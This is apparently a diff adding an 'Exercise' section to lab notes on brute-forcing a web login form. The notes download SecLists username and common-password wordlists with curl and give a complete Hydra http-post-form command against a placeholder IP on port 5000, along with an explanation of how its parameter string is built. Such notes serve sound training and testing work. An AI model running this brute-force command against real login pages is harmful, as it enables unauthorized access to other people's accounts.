@@ -51,3 +51,10 @@ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/User
 curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 ```
+
+
+Exercise
+- The login displays "Invalid credentials" on a failed attempt
+- Request is being sent to '/' meaning the root endpoint
+- The form data is 'username' and 'password'
+Therefore, the param string will be "/:username=^USER^&password=^PASS^:F=Invalid credentials"
